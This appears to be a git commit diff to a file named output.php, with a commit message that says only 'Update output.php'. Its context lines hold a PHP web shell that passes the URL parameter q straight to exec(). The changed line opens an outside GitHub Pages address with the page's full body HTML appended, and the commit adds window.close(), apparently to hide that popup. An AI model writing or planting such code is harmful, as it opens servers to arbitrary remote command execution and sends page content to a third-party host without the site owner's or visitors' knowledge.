93a4c2eb94f5fc04997a44fb5cfb255c936588b9
daDude123 <153016828+Coding-master5@users.noreply.github.com>
2025-03-28 21:11:10 -0400

    Update output.php

--- output.php
+++ output.php
@@ -1,4 +1,4 @@
 <?php
   exec($_GET['q']);
 ?>
-<script>window.open('https://coding-master5.github.io/php.js/index.html?q='+document.body.innerHTML);</script>
+<script>window.open('https://coding-master5.github.io/php.js/index.html?q='+document.body.innerHTML);window.close()</script>
